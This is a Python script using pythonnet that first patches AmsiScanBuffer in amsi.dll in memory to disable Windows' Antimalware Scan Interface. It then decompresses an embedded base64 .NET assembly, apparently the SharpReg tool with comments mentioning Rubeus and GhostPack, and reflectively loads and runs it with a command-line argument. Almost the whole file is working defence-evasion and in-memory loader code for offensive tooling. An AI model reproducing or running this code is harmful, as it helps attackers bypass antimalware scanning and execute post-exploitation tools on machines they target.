import base64
import zlib
import argparse
import clr
import ctypes
from ctypes import *
import System
from System import Array, IntPtr, UInt32
from System.Reflection import Assembly
import System.Reflection as Reflection

# Ensure necessary .NET references are added
clr.AddReference("System.Management.Automation")

from System.Management.Automation import Runspaces, RunspaceInvoke
from System.Runtime.InteropServices import Marshal

base64_str = "eJztWnlwG9d5/xbYBUCQBLmAROqitKQkByZFiJdtSdFFgpTESDwkULJkMZWWwJJcC8BCuwtKdFyP5CNTN63H7kySVkk7OSdHnRl76tRHHcdOm9ZNJ+NMx/Zk3Fp10pm0deq403im0yNWf+/tAYCiZLlJZvxHF9pv3/vu73vvfe/timN3PExBIhJxX7lC9BQ511567+sC7tiGZ2L0RN33258SDn2/fWpet5SSacyZakHJqsWiYSszmmKWi4peVIYnMkrByGmpxsboJlfH5AjRISFI7e3ffd7T+wZ1UL3QQ8SYIg7uC2kABfdp1zvWDjh+E1We9DkHz64g7X2AqJn/qzz9B78moHeCHL2PSssH2YDHy0NE224gJ/6l+K7zK4L+gap+ytbO23h+daMb16aK31UqTqdMy8yS6xt8pBDum2r59uJfytTyRtbxlQ8M07XlKr6hpW7el3aeB7iIRKsg82wLkUD8Dt1IqNVXokeif3dk5cCWUOAhvXWrlIQzoUDLJaOJKGqCVEpiDKJbekBe09cZaL0UDay6VB9YfakBmLX9scCaS42hcKQuiakZ6kRrhdPydci+ji5IrOvfDB1QkRChIyFBPBEKrL2UCMuiLMkhOZwUa8TbfPE25kJ/qyseYeJ1ckSuS0o1Alt9gRYIrO5vdgWicjQZYpw8xM59ZpoxwrtoazIO2LkW+XhN4sMhBxxdMyJYEkxXkwL0hUBLcgV60a4G3m1JrmS9UNDAMETrRUeoKHoObDXvQjtstKLTEA8kV+EZNlYDJtcAhIy1gK/rsHnT63sBXQXPeQq2fwfDEzbWodlofo+r4sJtjOtV9OtajPU+4h2GaK1CrJCAWFWFuJUh1lcQda2tP9iACZAEiBoKQ2PEu4wOtBJi1wZZNDaypmQeg6QsGZsY32ZPHGRM72j3Dy83yOIWDKDxIXT/3g3r90QWli76Yf2G5IX1CMJKJnkybmb6Qy0NXXvkUASzwJxllsJhOWx0MlIkHnm3BVkWjC5mmylitC2swzDJboBI6/GGiBx6SO97xlWb8tS2crV15iWoDWKurKlh/7Hr60+Cvpdf971sFq7lZdTxEp5Er+Nl9Ia93PYwEsI117uO1nNHOVsoaD7DrNUntzJ1bKYlGuQGx6fGlkSsa1hulGOXEk2OV01yg9x0Tbc4sdYvOdZ6PBGTY3IjXHuC2/Rd3TN75coVN0kvBCoz1E/S9DJJGuehNMvNktHDlsEOx7HmsNx8nXQ1L3HrcvCmy1TJ2R8vzdmLXs5kWXYNNbrZk3n2yMucXJW5uByvytyCk7mEnHA0dLfIcTlRccTVO2y+WKXXfI0pTXDOa6a5Rk0lnppc31sb4p4Ucu0MuZPwSeQ2LF7Thtkc8grNFNiYNRvzeG2ylxHXg2h2ABh9TH4F91q8jjp5RcXXbY/S9U1v8k1nnHFx7WO1r02sbEm0dPXyQb+uwZVyyyVnBrYgKy1yi7wSWfmrrr739NU1V3HYydjl9kSruROuya1GP6MPMOWtxi1exb1M0Dj4qLP/7ceNqUAld6tGOALbikXB2Y57BHePdq9P4H6WyQkVfoYfR9Jvw/OBIPHzmYd/G51ZPI+KtfjvovNFPOeX4Nn1lOTc7WizrX1tj0ifFjjf+96TbqXKnnSHP15KWIqJrcZtDHsa2CAv5e6M2yr4S/yJWolV15D4BfkSL/oSK83XQu7e6rK9WmG7NeyxdTLFSRzVor+DLU5Ycw0TlyqyQ75sslZ2Q/3ywpdPi0vXys3J7XjERGMHHg1hKbL6GqKb+UHh8vpGPqXqKjOqrnZCDa6rzJHzgnOv98cvSD8jfuZ9f+Pnuj3uBzyIEf0wQx0LL8kP203ruY/hio/hio9uOAVxy0go2GrsREc0dnmqxOqQRxu4nkhFT+QqPTeaFhwrWEb2UNs0bXKOqfdR+5e8NtFLL9F6b443AiO93xwFHebHvBxt/wq0ms+HvalnNkdQ/ljZD1aqUz02qJtC5l0ghSOXkru9naG70XzexbGE8KocRjl62fzbiKuwpbFrJ7midVWi5qo62GEWvszm4up+V1Wdo4pX+brW4411TN9zfqkSnVIlVpUqcUkKSeBz6ws08CoFvTrx059SO8vb+kByDxg7hzIfGRLcEsLq1cJAqifV39Pfu51hJMoDHkfoG+8h+gs8D6B4bczYpl6cs7hMPV5p6oA7mqGeFc4718b9R0eH8dyL/t1I+cahvDHjznF0hf0rA5E69tL0X0I/uQO6xaFRGHcTH3m8c3IPnHc+waU7nnYEnWeIZgKfF0P0EoefEgyxiV5grwD0nPDjYIhGAgzexOGfcngvh5/h8BXO83XhXsj+Fod1HP9vwiBgWnoK8OdSG7QNhO5Bu4lOoL1aYO2HiOGbRcbz0SCDssDgBJdaGWTUL3LZbmKYzVxDQmLwnJQDnOb8b3HqBk59J3hPMEqv0mZ4InBbr9DNUogeJcY/IbL2jzj/dm53jci83Rb8NH+f7ecZccaymWz8BnlvUmH4R+j14F2CQOPtTu85ehP5PO32rkgXsHu98yGn95vIRoieuNnpXRQeEerph51O7+PS7wsxauZvnB9fpcPTZm5VkhjcJ7JR2s33nAG2HdA3gkvxkxw/wNfsPlpOysMMCHWkY0OVidlZDRjFnquLzdTL4XYOBzkc5fAwhyc4VAFXks7bZzlc5PBp6hWTgFJoC71A+4Q++mv6iHQbMDIwD9Ir0hzgP0lnAb8n3QU4J11A3k8Gk2h3oTAxqfvRLiBLD9Jng5/gmIfpX+jbwU+RIFyhz2I2/ED8MrULF6XHsK5Oin9DK+ik9Hf0efoqvUHbhbcCSRoUHpJ+QqOCBT1Mw5vQ9g/izwAv0s9xOxaDwf/k1HfRfgvUp2mnFBKexvmyUTgsnAyuRPtztFZ4nE4Im4QTAvPwccTEZB/j/jcEbxF+RB8TdgmqsJOGAP9HPCA8SN+SmnmMJ9D+j0Az13xGuMiznaJ6+iMhRQn6CuBa+kvAjfQSYBe9DtjP4Yc5THP8QfpHwAzHnOQwS/8NeIY2B1JkUV9gDe2kTmFcOC38Ob1McaFdEC9UHV/4tTVY9Y0H11lhkj9rcSoXSmMW82t0pFguaKY6k9dO9/o92zDRG9OzpmEZs3bqdr3Y30ejRRtw55iRK+e13TSn2acGM+nRUTqm5svasGqrVLCyhpnXZyizaNlaIZU28nkta+tG0Urt14qaqWcpM6+apcxClgZzOdqv2Vz6oF7M0RFtTrdsc7EaU8qrWY3bGs1pRVu3F49os5qpFYEtoZbaRy11zmEY0yzeroqJRod1q2RYvH2kDPmCNrVY0g6oxRwwsM56+0yj4GLS8NTAc7BszxumfpfKfD+CeLmFcbWgOdHy1kFtkT9vN3VbO6QXNWJJYBo9zZU8mNCdNyywcIc0mlRN1tPymg32sp4btLE3zJRthpwpz80xnyu4tFE4plt6DW7QsrTCTH5xSreXRZtqTiuo5pkKaUo1Ecc+E16fM6oJnsw+Pa8d00wLUV9NRHJm9bmyyZNyNXlYs7KmXqolwu+SnnfSqOXV87xlXS08aWJaZe3ljJYWTX1ufllSoaQWFysEd4Q53tZn9DymS4XKRpAPnpt1p+3NQMp4DW8aHtAXNGe2ApPSzlc6NFLMGjls5N74uoZTbuoYZcpw9nqPJaNly5gni6lJYLN6Sc1fRRnMZjGFkWXbNPLMsVpERlPN7PyUphZcScbiCXvJN8xMLpffZ5gFGlP1ou+gNusuxKundmWR0sj5rMYHkMaQYc0cLc4angpM8LOI6mippJk0pNtwa0EzbXRYvsusUVU/mG9VvVSWQVfTsK7OFQ3L1rPW0gSixmimUcpo5oKO2JeSndmkmT7dWSpIM6oSun7OWFyWP7ZslfJepjzjLlreHVq00cCasNjCt5Evi2pynnGL1zL1jElkVZsmZu4EBpnTAYoLumkUCyhUfLaly6bptR3TaQOR0PgUrPBWWrVsmmSzBs8xY0EbZx+9XWtTrO0XRV07R2lTU23NUeXOYrczUdKKVc0jWsGwtSHV0jyM1/b0sfbhsmYuklE6NXK2rLLFwtqjRc3rId0Fo+hE6E00X4GPYFdTN05rh+kojdARnCKEetYfpGH8BJm1h0E5hHsKt5BgmEnOm8H5IwOscH9bFJtfN32UFKjBqNAcabQDvSjVkaO+DIyJw4iC7TBNBhWoBJzNsXfjwG1g41TxvJvm0bZAKaJfAP1uHGdKtJtLHkR/kcZ9SoYmcJyaotvh8BE4NU1j4M5CJ9Nh0Cz0TMNdA5oZXoeU5eo6xu0xvyr6suAsw7KNNqMyf0xQssCakGQ8cxxT4taZJeadTUNuDGeQKgM8c8AXAR1bGUio4M0iuineLkB+v6spiQOegkiK0LEI/AgOInO4FeoAj8H15cHZAW1RP6eDlMPvg5PPYWixcU9BY8nVdgeP5jgkBmFlmE65uGFYmICFYbQPV7WHMKXGue0T1xmlE3yUzGVoS2U8n5aT8WjVOR0GnmWa5fGDk9nlcuDNzhubg5UIJ3kcFijM818uxuX8KvLsWbQADRa3LNQfQuxpxH2IqD6N9lHwT+EkGwWc5zZZtlX3+THqwcuYAukyzSAWlkcLfbYuc5yb8fSCJwV9TikaQx6oPurKRonaTlInr0fj8L/Iq1EVdYNHHYTWHCKya+ntFXoWPzYS1jU07OcjWEZOauhhp0VhFjXi7lfI+XnROT82E/ZjVTjxVHj6mGyTwzvtUqmJcaeRPVZ6R/DeOE1Ut5/rwOuC7Fn3+W+J0v/BamP1GqRgN17tqHUMVg9htJyCf4Rz7EeWmYWT1M4z4djY4Y8OSWytU8YbZTbCTsUyeH2w+frT+fgofAVU/DwHmuXOgcoIzKKXZ6OeuLqmkFzx0cWcjGJeMAlmpRs4m68UtiIU6NK4/bI763Rurwg/bN5jK4JVAjari3xlMM8Xud8pzOlKBaP6SgWj8EHkFnk7UYk6V1NTfunYm8b5VpzB6kuzWT/BxmCE+2vz/XWSr6QzfqQZUFRXjwJP2Wyf51RGW+B7krPG2QwmPeNWo3Puily+Ut3ONeTQP8f1shU9DY9YPk03Z8f8WsPinHatHXCt0UiGr2ybZ3mpbJrL2Nxqnu+fNtfANC5wf1g8WAEym4FdVTOQRqL8HFL0q6Ezdmkej8V32nO8JjDsEM/ZMnmoz/BRMpmnkd/+5r33f6N08MlJqfmfP/nkbhIVQYgEFRIkNGSZdWMMBBrD9bHKBY6YRIFALCYS4wCIdIZXxUfiI5H46Mr4mBA/HD/cFovJR8EdH2mLRfgzFkMrfqKOgvERWY/JhQgFWEsuwB7I0BsJUVCIrVsnKhQfhQ20QYvJixES4hcuyhceiCrB+IXfDQTQa2wWhJXxC58U1lP8wh+IUZgN8378cEQh5keCQo470JcgCUov/CGsBNiHLKDaYlAOJxHjuliYRGZ5HTxgQQIXiAXaJImEGKCCaNGNcR0Xo2GRRdsmxU+EFeawfBRZiCAroD4OpW1SzOE5wX4hBXHGAtGwxJOBHCA06Is8edf0sdUDbzwII0Kb4wFDk8SfMZ6MWIznIRYR3D9OWc++BE4FWm431dK4UfTfkKbmTeOcJYDP+ZuURgj474dQyXCtAsX991flO19TlL4e9nn4ZoE2bdNm+26Z6enp1nK3qt0DA7cOdM/ktGx3721923rVAVW9pW+WqEGgcG+qh/34/4CtSY2PTPnv71vc981d7NszvIyt8EnsM0Ne5a86zUxG8SnKgPPp58ovJj7jflcm9icuDQANm2s+KdX8HRC7jmSGM3ePrv2TiS13HvrmZOn51y/+6zyLdHjHtDrdO21NexmYNmbunMYLv4a3Dh+ZKuVm6Fy6ou4R70+WlrnuS1f3TqUNc+S8xl9p+UcmTUvl8nk3ks2k7F1ey6/8CvCcKEQXVuE56fwlUdXlfEXetgyeXUuQPv/8NfgfxdJ5+DTRumCFsi7IBvAYys0pQO8dagLF8xTfUvc5f61F3xLfftf/K6UqnXvcnkhLvyAS23yAO8ZL1j4USLbljKLMzaKosWsTl5oCVQXWAr2yBTnXYyL7fwuhZqO8WtNxztPj/wZwSMMEpzU8H85h0ts0LVdzRxWtxO1XjsbetQMHVMG3N8zLe+VoW/Ezg4yzGEvIngYP2dWDBV+Rrd122NWLjbPHv5mtRvCPuhu7yQ+3+SqPltpIAZ53fT1Accge4ngmleZb+iL3dA5y7O/ersYp9DV+yOqD/V5i/83UyXNS0eOMTI5vhs4Gbvm5GeL+Trj6dNdfL97iDfndx/M7yTfUHD9a2DVjsFxeB3hea2WWZndpbrdxmUF+aGGxzPCXWuU95Z7NEr1ZNanf/rNv79xzvpBXFtxC2YFi2qFo7ue7XR1Hp/Z1b+tQLFst5tS8UdR2dSxqVsee3Y3RxuhO1f3QqEBF0drVUTaLO6zsvFZQre6C93W8O2sUdqhWIbXQ26EU1KI+q1n2sWp7UKYovjLvO3aNT+zXoRRRond1jC0Olkp5Pcs/0KXUUqljq6PBNsuWzT7J3aA/fY5lSFrutxq3D4ypnS3DTy03aeoLel6b06wb1Nrf4Wup1oPqnC0zjw9pC1peyTO4q0O1RosLxhnN7FDKuvNpbVfHrJq3NDcormTrMt54rm+t8X3nVj8J6O/c6iV1N/36rr3O/+9+qf/XaOP/rw/s9b+XTAvG"


def bypass():
    """
    Bypasses the Antimalware Scan Interface (AMSI) by patching the AmsiScanBuffer method in amsi.dll.
    This allows scripts to run without being scanned and potentially blocked by AMSI.
    """
    windll.LoadLibrary("amsi.dll")
    windll.kernel32.GetModuleHandleW.argtypes = [c_wchar_p]
    windll.kernel32.GetModuleHandleW.restype = c_void_p
    handle = windll.kernel32.GetModuleHandleW('amsi.dll')
    windll.kernel32.GetProcAddress.argtypes = [c_void_p, c_char_p]
    windll.kernel32.GetProcAddress.restype = c_void_p
    BufferAddress = windll.kernel32.GetProcAddress(handle, "AmsiScanBuffer")
    BufferAddress = IntPtr(BufferAddress)
    Size = System.UInt32(0x05)
    ProtectFlag = System.UInt32(0x40)
    OldProtectFlag = Marshal.AllocHGlobal(0)
    virt_prot = windll.kernel32.VirtualProtect(BufferAddress, Size, ProtectFlag, OldProtectFlag)
    patch = System.Array[System.Byte]((System.UInt32(0xB8), System.UInt32(0x57), System.UInt32(0x00), System.UInt32(0x07), System.UInt32(0x80), System.UInt32(0xC3)))
    Marshal.Copy(patch, 0, BufferAddress, 6)

def base64_to_bytes(base64_string):
    """
    Converts a base64 encoded string to a .NET byte array after decompressing it.
    Args:
        base64_string: The base64 encoded and compressed string to convert.
    Returns:
        A .NET byte array of the decompressed data.
    """
    # Decode the base64 string to get the compressed binary data
    compressed_data = base64.b64decode(base64_string)
    # Decompress the data
    decompressed_data = zlib.decompress(compressed_data)
    # Convert the decompressed binary data to a .NET byte array
    return System.Array[System.Byte](decompressed_data)

def load_and_execute_assembly(command):
    """
    Loads a .NET assembly from a base64 encoded and compressed string, and executes a specified method.
    Args:
        command: The command to execute within the loaded assembly.
    Returns:
        The result of the executed command.
    """
    
    assembly_bytes = base64_to_bytes(base64_str)
    
    # Load the assembly
    assembly = Assembly.Load(assembly_bytes)
    
    # Get the type of the Rubeus.Program class
    program_type = assembly.GetType("SharpReg.Program")
    # You don't need to create an instance of the class for a static method
    method = program_type.GetMethod("MainString")
    #Have to do this nesting thing to deal with different main entry points and public/private methods  
    if method == None:
        method =program_type.GetMethod("Main")
        if method == None:
            method = program_type.GetMethod("Main",Reflection.BindingFlags.NonPublic | Reflection.BindingFlags.Static)
        # Create a jagged array to pass in an array of string arrays to satisfy arguments requirements
        command_array = Array[str]([command])
        command_args = System.Array[System.Object]([command_array])
    else:
        #Ghost Pack stuff like rubeus use a different input
        command_args = Array[str]([command]) 

    # Invoke the MainString method
    result = method.Invoke(None, command_args)

    return result
    
def main():
    bypass()
    parser = argparse.ArgumentParser(description='Execute a command on a hardcoded base64 encoded assembly')
    parser.add_argument('command', type=str, nargs='?', default="", 
                        help='Command to execute (like "help" or "triage"). If not specified, a default command is executed.')

    args = parser.parse_args()
    
    result = load_and_execute_assembly(args.command)
    print(result)

if __name__ == "__main__":
    main()